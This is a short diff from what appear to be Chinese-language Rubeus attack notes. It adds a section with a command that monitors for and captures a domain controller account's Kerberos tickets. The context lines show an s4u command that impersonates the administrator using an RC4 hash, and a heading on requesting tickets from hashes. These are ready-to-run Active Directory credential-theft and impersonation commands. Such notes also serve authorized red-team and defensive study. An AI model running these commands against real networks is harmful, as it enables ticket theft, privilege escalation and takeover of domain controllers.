@@ -97,6 +97,11 @@ rubeus.exe s4u /user:my$ /rc4:…… /impersonateuser:administrator /msdsspn:CIF
 ```
 
 
+# 监听流量认证
+```
+Rubeus.exe monitor /targetuser:US-DC$ /interval:5 /nowrap
+```
+
 # asktgt
 
 ## 根据哈希请求票据
